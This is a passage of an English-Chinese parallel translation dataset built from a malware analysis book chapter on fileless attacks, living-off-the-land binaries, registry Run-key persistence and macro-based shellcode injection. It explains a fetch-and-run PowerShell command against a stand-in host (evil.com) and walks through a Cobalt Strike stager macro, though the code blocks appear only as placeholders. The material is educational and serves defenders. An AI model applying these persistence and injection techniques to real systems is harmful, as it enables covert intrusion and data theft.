- en: <hgroup>
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: <hgroup>
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">15</samp> <samp class="SANS_Dogma_OT_Bold_B_11">FILELESS,
    LIVING OFF THE LAND, AND ANTI-FORENSICS TECHNIQUES</samp>
  id: totrans-1
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">15</samp> <samp class="SANS_Dogma_OT_Bold_B_11">无文件攻击、利用系统资源攻击和反取证技术</samp>
- en: </hgroup>
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: </hgroup>
- en: '![](../images/opener.jpg)'
  id: totrans-3
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/opener.jpg)'
- en: No matter how covert modern malware is designed to be, it’s always bound to
    leave at least trace evidence of its existence in the victim environment. That
    evidence might be a persistence mechanism, such as a system startup task or service,
    or simply a file dropped to disk during the attack. In the latter case, once a
    file is on disk, defenses such as anti-malware have a better opportunity to detect
    the malware and thwart the attack. Trace evidence also can give investigators
    an edge in analyzing the attack post compromise. Malware authors, realizing this,
    have turned to fileless malware and anti-forensics techniques.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 无论现代恶意软件设计得多么隐蔽，它总是不可避免地在受害者环境中留下至少一些存在的痕迹。这些痕迹可能是持久性机制，比如系统启动任务或服务，或者仅仅是攻击过程中写入磁盘的文件。在后者的情况下，一旦文件写入磁盘，像反恶意软件这样的防御机制就有更好的机会检测到恶意软件并阻止攻击。痕迹证据还可以为调查人员提供分析攻击后期入侵的优势。恶意软件作者意识到这一点，因此转向了无文件恶意软件和反取证技术。
- en: '*Fileless malware*, sometimes called *memory-resident malware*, is malware
    that doesn’t create or tamper with files on the hard disk; instead, its artifacts
    reside only in memory. More broadly, the term *fileless attack* denotes that the
    entire attack chain (or at least substantial parts of it) is fileless. Fileless
    attacks make malware detection more difficult for host defenses like anti-malware
    and make analysis more difficult for forensics investigators trying to understand
    the scope and impact of the attack. These attacks take advantage of techniques
    such as process injection, described in [Chapter 12](chapter12.xhtml), and Living
    Off The Land Binaries (LOLBins), discussed later in this chapter.'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: '*无文件恶意软件*，有时称为*内存驻留恶意软件*，是不创建或篡改硬盘上的文件的恶意软件；相反，它的痕迹仅存在于内存中。更广义地说，*无文件攻击*一词指的是整个攻击链（或至少其中的主要部分）是无文件的。无文件攻击使得恶意软件检测变得更加困难，因为它对主机防御（如反恶意软件）的影响较小，也使得取证调查人员在分析攻击的范围和影响时更加困难。这些攻击利用了如[第12章](chapter12.xhtml)中描述的进程注入技术，以及本章稍后讨论的“利用系统资源二进制文件”（LOLBins）等技术。'
- en: '*Anti-forensics* is a class of techniques in which the attacker attempts to
    conceal or remove traces of the attack in order to inhibit future forensics investigations.
    An attacker may instruct their malware to terminate itself and remove traces in
    memory, delete or corrupt files on disk, clear or tamper with logs and evidence,
    or even completely destroy the victim system, all in an attempt to inhibit future
    investigations. We’ll discuss anti-forensics later in this chapter. First, let’s
    dive deeper into fileless attacks.'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: '*反取证*是一类技术，攻击者通过这些技术试图隐藏或删除攻击痕迹，以抑制未来的取证调查。攻击者可能指示他们的恶意软件终止自身并删除内存中的痕迹，删除或损坏磁盘上的文件，清除或篡改日志和证据，甚至完全摧毁受害者系统，所有这些都是为了抑制未来的调查。我们将在本章稍后讨论反取证。首先，让我们更深入地了解无文件攻击。'
- en: <samp class="SANS_Futura_Std_Bold_B_11">How Fileless Attacks Work</samp>
  id: totrans-7
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_B_11">无文件攻击的工作原理</samp>
- en: While traditional malware threats often rely on files being written to the disk,
    fileless malware runs entirely (or nearly entirely) in memory to leave as little
    footprint on the victim host as possible. [Figure 15-1](chapter15.xhtml#fig15-1)
    illustrates a hypothetical but realistic fileless attack.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然传统的恶意软件威胁通常依赖于文件写入磁盘，但无文件恶意软件完全（或几乎完全）在内存中运行，以尽量减少在受害主机上的痕迹。[图 15-1](chapter15.xhtml#fig15-1)展示了一个假设但现实的无文件攻击。
- en: 'Let’s break this attack down step by step. First, the malware author sends
    an email containing a malicious Microsoft Word document to the victim. The victim
    user happily opens the document (as people often do), which subsequently executes
    an embedded *Visual Basic for Applications* (*VBA) script*: a piece of code that
    can be embedded in legitimate documents to automate frequent tasks but is often
    abused for more malevolent purposes. The embedded VBA script invokes a built-in
    Windows utility called *certutil.exe* that downloads an encoded PowerShell script
    from the attacker’s staging server. Once the encoded script has downloaded, certutil
    decodes it and the script is executed using *powershell.exe*. This PowerShell
    script writes code to the Windows registry that will be executed upon a system
    reboot. Shortly thereafter, the victim user shuts down their laptop for the evening
    and heads home.'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们一步步分析这个攻击。首先，恶意软件作者向受害者发送一封包含恶意 Microsoft Word 文档的电子邮件。受害者用户愉快地打开文档（就像人们常做的那样），这随后执行了一个嵌入的*Visual
    Basic for Applications*（*VBA*）脚本：这段代码可以嵌入到合法的文档中，用来自动化常见任务，但经常被滥用用于更恶意的目的。嵌入的
    VBA 脚本调用了一个内置的 Windows 工具*certutil.exe*，该工具从攻击者的暂存服务器下载一个编码的 PowerShell 脚本。一旦编码脚本下载完成，certutil
    会解码它，然后使用*powershell.exe* 执行该脚本。这个 PowerShell 脚本会将代码写入 Windows 注册表，并在系统重启时执行。不久之后，受害者用户关闭了笔记本电脑，准备休息并回家。
- en: '![](../images/fig15-1.jpg)'
  id: totrans-10
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-1.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-1: A fileless attack</samp>'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-1：无文件攻击</samp>
- en: Fast-forward 12 hours, when the user boots up their laptop to prepare for a
    new workday. Upon system boot-up, the malicious code stored inside the registry
    executes. It contains an obfuscated PowerShell command that downloads another
    script from the attacker’s staging server. This script is injected into the running
    PowerShell process, leaving no files on disk. The downloaded script contains bytecode
    that forms an executable in memory, which is then injected into a new process
    (*malware.exe*). The malware payload is an infostealer variant that begins harvesting
    sensitive data from the host.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 快进到12小时后，用户启动笔记本电脑准备迎接新的一天工作。系统启动时，存储在注册表中的恶意代码开始执行。它包含一个混淆的 PowerShell 命令，从攻击者的暂存服务器下载另一个脚本。这个脚本被注入到正在运行的
    PowerShell 进程中，完全没有在磁盘上留下任何文件。下载的脚本包含字节码，在内存中形成一个可执行文件，然后被注入到一个新进程（*malware.exe*）中。恶意软件的有效负载是一个信息窃取者变种，开始从主机中收集敏感数据。
- en: This attack may seem overly complex, but to anyone who has experience in analyzing
    fileless attacks, it’s not at all far-fetched. In this scenario, there are a few
    interesting techniques being used. First, a malicious command is written to and
    stored in the registry. Fileless malware sometimes uses the registry to store
    commands, code, or configuration information in order to avoid writing new files
    to the disk. Since the registry is stored on disk in a proprietary binary format
    and is only in a human-readable state while resident in memory, this is still
    considered a fileless technique (see the “The Paradox of Fileless Attacks” box
    for more on this). Malware that hides in the registry is sometimes called *registry-resident
    malware* (which is a subcategory of fileless malware, but I’ll touch on that in
    a moment). The PowerShell command that executed from the registry also downloads
    and executes malicious code completely in memory.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 这个攻击看起来可能过于复杂，但对于有分析无文件攻击经验的人来说，这一点也不难理解。在这个场景中，有一些有趣的技术被使用。首先，一个恶意命令被写入并存储到注册表中。无文件恶意软件有时会使用注册表来存储命令、代码或配置信息，以避免在磁盘上写入新文件。由于注册表以专有的二进制格式存储在磁盘上，并且只有在驻留在内存中时才处于人类可读状态，因此这仍然被视为一种无文件技术（有关更多内容，请参见《无文件攻击的悖论》框）。隐藏在注册表中的恶意软件有时被称为*注册表驻留恶意软件*（这是无文件恶意软件的一个子类别，稍后我会提到）。从注册表中执行的
    PowerShell 命令还会完全在内存中下载并执行恶意代码。
- en: Second, the Windows utilities invoked in this attack (*certutil.exe* and *powershell.exe*,
    specifically) can be classified as LOLBins, legitimate utilities that are built
    into Windows or otherwise already available on a target system. These utilities
    are used for common tasks such as system administration and maintenance, but they
    also can be easily abused to execute unauthorized code and hide malicious actions.
    Fileless attacks often take advantage of LOLBins, some of which can be invoked
    by malware to execute code in memory.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 第二，攻击中调用的 Windows 工具（特别是 *certutil.exe* 和 *powershell.exe*）可以被归类为 LOLBins，LOLBin
    是指合法的 Windows 工具或已经在目标系统上可用的工具。这些工具通常用于系统管理和维护等常见任务，但也可以很容易地被滥用来执行未经授权的代码并隐藏恶意操作。无文件攻击通常会利用
    LOLBins，其中一些可以通过恶意软件在内存中执行代码。
- en: <samp class="SANS_Futura_Std_Bold_B_11">Persistence and Registry-Resident Malware</samp>
  id: totrans-15
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_B_11">持久性和注册表驻留恶意软件</samp>
- en: In the fileless attack scenario just described, the malware wrote a PowerShell
    command to the registry and set it to autostart on the next boot-up. The Windows
    registry can provide a safe place for malware to hide because it is unlikely to
    be discovered there, at least by someone who doesn’t know specifically what to
    look for. Not only that, but anti-malware and other endpoint defenses also may
    not be configured to scan the registry for malware.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 在刚才描述的无文件攻击场景中，恶意软件将 PowerShell 命令写入注册表，并将其设置为在下次启动时自动运行。Windows 注册表为恶意软件提供了一个安全的藏匿地点，因为在这里它不太可能被发现，至少对那些不知道具体查找什么的人来说是如此。不仅如此，反恶意软件和其他终端防护程序也可能没有配置为扫描注册表中的恶意软件。
- en: 'This technique is one way malware tries to establish *persistence*: that is,
    remaining on an infected host even after a system reboot. Malware can use any
    of several tactics to persist on a victim system, but here we’ll focus on registry
    persistence because it ties in directly with registry-resident malware.'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术是恶意软件试图建立 *持久性* 的一种方式：即在系统重启后仍然保持在受感染的主机上。恶意软件可以使用多种策略在受害系统上保持持久性，但这里我们将重点讨论注册表持久性，因为它与注册表驻留的恶意软件直接相关。
- en: '<samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    are special registry keys that are invoked when a user logs in to a system. They
    can point to file types like executable files and scripts and even accept command
    line parameters. They reside in the following registry locations:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> 和 <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    是特殊的注册表键，每当用户登录系统时都会调用它们。它们可以指向可执行文件、脚本等文件类型，甚至可以接受命令行参数。它们位于以下注册表位置：
- en: '*HKLM\Software\Microsoft\Windows\CurrentVersion\Run*'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*HKLM\Software\Microsoft\Windows\CurrentVersion\Run*'
- en: '*HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce*'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce*'
- en: '*HKCU\Software\Microsoft\Windows\CurrentVersion\Run*'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*HKCU\Software\Microsoft\Windows\CurrentVersion\Run*'
- en: '*HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce*'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce*'
- en: The <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys are invoked
    each time the user logs in. The <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    keys are invoked only one time, at the next login. Each key consists of a name
    and a value that represents a command to be run or a file to be executed.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> 键在每次用户登录时都会被调用。<samp
    class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp> 键只会在下次登录时调用一次。每个键都包含一个名称和一个表示要运行的命令或要执行的文件的值。
- en: By manipulating these keys, a malware author can execute malware and its associated
    commands directly from the registry. To demonstrate, I’ve added a new <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp>
    key named <samp class="SANS_TheSansMonoCd_W5Regular_11">Evil</samp> to the registry
    key *HKLM\Software\Microsoft\Windows\CurrentVersion\Run*. [Figure 15-2](chapter15.xhtml#fig15-2)
    shows this key, which can be viewed and edited with *regedit.exe*.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 通过操作这些键，恶意软件作者可以直接从注册表执行恶意软件及其关联命令。为了演示，我向注册表键 *HKLM\Software\Microsoft\Windows\CurrentVersion\Run*
    添加了一个名为 <samp class="SANS_TheSansMonoCd_W5Regular_11">Evil</samp> 的新 <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp>
    键。[图 15-2](chapter15.xhtml#fig15-2) 显示了这个键，它可以通过 *regedit.exe* 查看和编辑。
- en: '![](../images/fig15-2.jpg)'
  id: totrans-25
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-2.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-2: Adding a new malicious
    Run key to the registry</samp>'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-2：向注册表中添加新的恶意 Run 键</samp>
- en: 'This key simply invokes *powershell.exe* and executes the <samp class="SANS_TheSansMonoCd_W5Regular_11">pause</samp>
    command. Now, every time I log in to my machine, a PowerShell prompt appears.
    Obviously, a malware author would rather do something a little more malicious
    than simply popping up a PowerShell prompt at each login. They might execute a
    more complex command like the following:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 这个键只是简单地调用 *powershell.exe* 并执行 <samp class="SANS_TheSansMonoCd_W5Regular_11">pause</samp>
    命令。现在，每次我登录我的计算机时，都会弹出一个 PowerShell 提示符。显然，恶意软件作者会更愿意做一些比仅在每次登录时弹出 PowerShell
    提示符更恶意的事情。他们可能会执行一个更复杂的命令，比如以下内容：
- en: '[PRE0]'
  id: totrans-28
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Once executed, when the user of the system logs in to Windows, this command
    downloads a PowerShell script (*evil.ps1)* from a remote web server (*evil.com)*
    and executes it directly in memory. We won’t touch on this command anymore here,
    as we’ll be covering PowerShell in more detail later in this chapter, but just
    keep in mind that malware can easily hide commands and code inside the registry,
    and using <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp>
    keys is one way it can do so. [Table 15-1](chapter15.xhtml#tab15-1) shows a non-exhaustive
    list of other <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys and
    persistence locations in the registry.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 执行后，当系统用户登录 Windows 时，此命令会从远程 Web 服务器 (*evil.com*) 下载一个 PowerShell 脚本 (*evil.ps1)*，并直接在内存中执行。我们这里不再讨论这个命令，因为本章后面会更详细地介绍
    PowerShell，但请记住，恶意软件可以轻松地将命令和代码隐藏在注册表中，使用 <samp class="SANS_TheSansMonoCd_W5Regular_11">运行</samp>
    和 <samp class="SANS_TheSansMonoCd_W5Regular_11">运行一次</samp> 键是其中一种方法。[表 15-1](chapter15.xhtml#tab15-1)
    显示了其他非详尽的 <samp class="SANS_TheSansMonoCd_W5Regular_11">运行</samp> 键和注册表中的持久性位置。
- en: <samp class="SANS_Futura_Std_Heavy_B_11">Table 15-1:</samp> <samp class="SANS_Futura_Std_Book_11">Registry
    Keys Malware May Use to Establish Persistence</samp>
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Heavy_B_11">表 15-1：</samp> <samp class="SANS_Futura_Std_Book_11">恶意软件可能使用的注册表键来建立持久性</samp>
- en: '| <samp class="SANS_Futura_Std_Heavy_B_11">Registry hive/key</samp> | <samp
    class="SANS_Futura_Std_Heavy_B_11">Description</samp> |'
  id: totrans-31
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Heavy_B_11">注册表项/键</samp> | <samp class="SANS_Futura_Std_Heavy_B_11">描述</samp>
    |'
- en: '| --- | --- |'
  id: totrans-32
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr>Software\<wbr>Microsoft\<wbr>Windows\
    CurrentVersion\<wbr>Policies\<wbr>Explorer\<wbr>Run</samp><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>Software\<wbr>Microsoft\<wbr>Windows\'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr>Software\<wbr>Microsoft\<wbr>Windows\
    CurrentVersion\<wbr>Policies\<wbr>Explorer\<wbr>Run</samp><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>Software\<wbr>Microsoft\<wbr>Windows\'
- en: CurrentVersion\<wbr>Policies\<wbr>Explorer\<wbr>Run</samp> | <samp class="SANS_Futura_Std_Book_11">These</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> <samp class="SANS_Futura_Std_Book_11">keys
    are similar to the keys already mentioned. Anything added to them will run upon
    user login. They are not created by default in Windows and so must be added manually.</samp>
    |
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 当前版本\<wbr>策略\<wbr>资源管理器\<wbr>运行</samp> | <samp class="SANS_Futura_Std_Book_11">这些</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">运行</samp> <samp class="SANS_Futura_Std_Book_11">键类似于之前提到的键。任何添加到它们的内容都会在用户登录时执行。它们在
    Windows 中不会默认创建，因此必须手动添加。</samp> |
- en: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr>Software\<wbr>Microsoft\<wbr>Windows
    NT\ CurrentVersion\<wbr>Winlogon</samp><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>Software\<wbr>Microsoft\<wbr>Windows
    NT\'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr>Software\<wbr>Microsoft\<wbr>Windows
    NT\ CurrentVersion\<wbr>Winlogon</samp><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>Software\<wbr>Microsoft\<wbr>Windows
    NT\'
- en: CurrentVersion\<wbr>Winlogon</samp> | <samp class="SANS_Futura_Std_Book_11">These
    keys contain Windows login configurations, including programs that execute upon
    login. These can be modified to run malware or malicious commands.</samp> |
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: CurrentVersion\<wbr>Winlogon</samp> | <samp class="SANS_Futura_Std_Book_11">这些键包含
    Windows 登录配置，包括在登录时执行的程序。这些可以被修改以运行恶意软件或恶意命令。</samp> |
- en: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>System\<wbr>CurrentControlSet\<wbr>Services</samp>
    | <samp class="SANS_Futura_Std_Book_11">This key contains information on the services
    configured on the host. Drivers are included here as well, in</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>SYSTEM\<wbr>CurrentControlSet\​Services\<wbr><DriverName></samp><samp
    class="SANS_Futura_Std_Book_11">. If malware installs a persistence mechanism
    (or malicious driver) as a service, this can be seen here.</samp> |'
  id: totrans-37
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>System\<wbr>CurrentControlSet\<wbr>Services</samp>
    | <samp class="SANS_Futura_Std_Book_11">此键包含主机上配置的服务信息。驱动程序也包含在此</samp> <samp
    class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr>SYSTEM\<wbr>CurrentControlSet\​Services\<wbr><DriverName></samp><samp
    class="SANS_Futura_Std_Book_11">。如果恶意软件将持久性机制（或恶意驱动程序）作为服务安装，它可以在这里看到。</samp>
    |'
- en: This is only the very tip of the persistence mechanisms iceberg. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp>
    keys described here are some of the most commonly used for fileless persistence
    techniques, but there are others. For more information, visit the MITRE ATT&CK
    site at [*https://<wbr>attack<wbr>.mitre<wbr>.org<wbr>/tactics<wbr>/TA0003<wbr>/*](https://attack.mitre.org/tactics/TA0003/).
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 这只是持久性机制冰山一角。这里描述的 <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp>
    键是文件无持久性技术中最常用的一些，但还有其他的。欲了解更多信息，请访问 MITRE ATT&CK 网站 [*https://<wbr>attack<wbr>.mitre<wbr>.org<wbr>/tactics<wbr>/TA0003<wbr>/*](https://attack.mitre.org/tactics/TA0003/)。
- en: <samp class="SANS_Futura_Std_Bold_B_11">Living Off The Land Binaries</samp>
  id: totrans-39
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_B_11">利用现有资源的二进制文件</samp>
- en: 'Now let’s turn to another technique malware might use to launch fileless attacks:
    LOLBins. There are several reasons why malware might invoke a LOLBin:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们转向恶意软件可能用来发起无文件攻击的另一种技术：LOLBin。有几个原因可能导致恶意软件调用 LOLBin：
- en: '**To bypass application restriction controls, such as AppLocker**'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: '**绕过应用程序限制控制，如 AppLocker**'
- en: AppLocker is a Windows security control for preventing unwanted applications
    from executing. Malware can bypass it by using system binaries as a proxy.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: AppLocker 是 Windows 的一种安全控制，用于防止不需要的应用程序执行。恶意软件可以通过使用系统二进制文件作为代理来绕过它。
- en: '**To avoid detection**'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: '**避免被检测**'
- en: EDR, anti-malware, and other endpoint defenses subject LOLBins to less scrutiny,
    since they’re often digitally signed and therefore verified by the operating system
    itself. Additionally, many LOLBins allow malicious code to execute in memory,
    which builds its evasion potency further.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: EDR、反恶意软件和其他端点防御系统对 LOLBin 的审查较少，因为它们通常是数字签名的，因此由操作系统本身验证。此外，许多 LOLBin 允许恶意代码在内存中执行，这进一步增强了其规避能力。
- en: '**To hide in the noise**'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: '**隐藏在噪音中**'
- en: Since daily sysadmin work requires the use of many LOLBins, it’s difficult to
    develop sound logic to detect the malicious use of these tools; the amount of
    noise they generate can be challenging for analysts to sift through.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 由于日常系统管理员工作需要使用许多 LOLBin，因此很难开发出有效的逻辑来检测这些工具的恶意使用；它们生成的噪音可能会给分析人员带来筛选的挑战。
- en: '**To hamper investigations**'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '**阻碍调查**'
- en: Since many LOLBins actually allow the execution of malicious code in memory
    and support fileless attacks, investigating these attacks can sometimes be more
    difficult than it is for those that leave a larger footprint on disk.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 由于许多 LOLBin 实际上允许恶意代码在内存中执行并支持无文件攻击，调查这些攻击有时比调查那些在磁盘上留下较大痕迹的攻击更困难。
- en: The classification of LOLBins can be quite subjective. Some experts claim that
    LOLBins are legitimate applications that can be abused by threat actors in unexpected
    ways. However, this definition would eliminate all applications that can be abused
    by actors in “expected” ways (invoking *cmd.exe* to delete a file, for example).
    My school of thought is truer to the essence of an attacker “living off the land,”
    meaning that an attacker can and will use anything available to them, and “expected”
    and “unexpected” use cases aren’t taken into account. In my opinion, a LOLBin
    is any application or tool that is commonly available and can be abused by actors.
    Let’s look at how this is accomplished with the help of VBA code and macros.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: LOLBin 的分类可能相当主观。一些专家认为，LOLBin 是可以被威胁行为者以意外方式滥用的合法应用程序。然而，这一定义将排除所有可以被行为者以“预期”方式滥用的应用程序（例如，调用
    *cmd.exe* 删除文件）。我的看法更符合攻击者“利用现有资源”的本质，这意味着攻击者可以并且会利用任何可用的资源，而“预期”和“意外”的使用场景并不被考虑。在我看来，LOLBin
    是任何常见的应用程序或工具，它可以被行为者滥用。让我们看看如何借助 VBA 代码和宏来实现这一点。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">VBA Macro-Based Malware</samp>
  id: totrans-50
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">基于VBA宏的恶意软件</samp>
- en: Living off the land techniques often begin with a malware-laced document that
    triggers the LOLBin’s attack chain. Such documents are commonly (but not always)
    Microsoft Word or Excel documents, and their malicious code is frequently in the
    form of VBA macros. *Macros* were originally designed to automate common user
    tasks in a document file, but as you’ll see, they’re also used by threat actors
    to deploy additional malware.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 土地生存技巧通常始于一个含有恶意软件的文档，该文档触发了LOLBin的攻击链。这类文档通常（但不总是）是Microsoft Word或Excel文档，恶意代码通常以VBA宏的形式存在。*宏*最初是为了自动化文档文件中的常见用户任务而设计的，但正如你所看到的，它们也被威胁行为者用来部署额外的恶意软件。
- en: <samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp>
  id: totrans-52
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: <samp class="SANS_Dogma_OT_Bold_B_15">注意</samp>
- en: '*At the time of this writing, the abuse of VBA macros for malicious purposes
    has significantly decreased. By default, Microsoft Office now prevents macro execution
    from documents originating from untrusted sources, so this attack vector is more
    difficult to actualize. However, actors may be able to bypass these limitations
    or use other document formats, such as Rich Text Format (RTF) and Portable Document
    Format (PDF), to achieve similar effects.*'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '*在撰写本文时，VBA宏被滥用于恶意目的的情况已经显著减少。默认情况下，Microsoft Office现在会阻止来自不受信任来源的文档执行宏，因此这种攻击途径变得更加难以实现。然而，攻击者可能能够绕过这些限制，或使用其他文档格式，如Rich
    Text Format (RTF)和Portable Document Format (PDF)，以实现类似效果。*'
- en: 'VBA macro code is quite powerful; it can even import Windows DLLs and call
    WinAPI functions. For example, the attack tool Cobalt Strike uses a macro embedded
    inside a Microsoft Office document to inject shellcode into a running process
    and download an additional payload (called a *beacon*) from a malicious web server.
    Here’s an example of the Cobalt Strike stager macro code, which has been slightly
    modified for readability and brevity:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: VBA宏代码非常强大；它甚至可以导入Windows DLL并调用WinAPI函数。例如，攻击工具Cobalt Strike使用嵌入在Microsoft
    Office文档中的宏，将shellcode注入到正在运行的进程中，并从恶意Web服务器下载额外的有效载荷（称为*beacon*）。以下是稍作修改以便于阅读和简洁的Cobalt
    Strike stager宏代码示例：
- en: '[PRE1]'
  id: totrans-55
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: There’s a lot going on here, so let’s go over it block by block. First, this
    code defines an array of bytes that, when converted to hexadecimal format, is
    actually malicious shellcode ❶. Next, the code checks whether the Windows environment
    is 32- or 64-bit and selects the appropriate directory (System32 for 32-bit architecture
    and SysWOW64 for 64-bit architecture) from which to invoke the Windows utility
    *rundll32.exe* ❷. The code invokes <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcessA</samp>
    to start an instance of *rundll32.exe* ❸ and then calls <samp class="SANS_TheSansMonoCd_W5Regular_11">VirtualAllocEx</samp>
    to allocate memory inside that process ❹. The allocated region of memory is the
    same size as the shellcode array.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 这里有很多内容，我们逐块分析。首先，这段代码定义了一个字节数组，当它转换为十六进制格式时，实际上是恶意的shellcode ❶。接下来，代码检查Windows环境是32位还是64位，并选择适当的目录（32位架构选择System32，64位架构选择SysWOW64）来调用Windows实用程序*rundll32.exe*
    ❷。代码调用<samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcessA</samp>启动一个*rundll32.exe*实例
    ❸，然后调用<samp class="SANS_TheSansMonoCd_W5Regular_11">VirtualAllocEx</samp>在该进程内分配内存
    ❹。分配的内存区域与shellcode数组的大小相同。
- en: Next, using a <samp class="SANS_TheSansMonoCd_W5Regular_11">for</samp> loop,
    the code writes each byte of shellcode into the newly allocated memory region
    using <samp class="SANS_TheSansMonoCd_W5Regular_11">WriteProcessMemory</samp>
    ❺. Finally, the macro code executes the injected shellcode inside the context
    of *rundll32.exe* by invoking <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateRemoteThread</samp>
    ❻. If you remember [Chapter 12](chapter12.xhtml), you may spot that this is a
    form of shellcode injection.
  id: totrans-57
  prefs: []
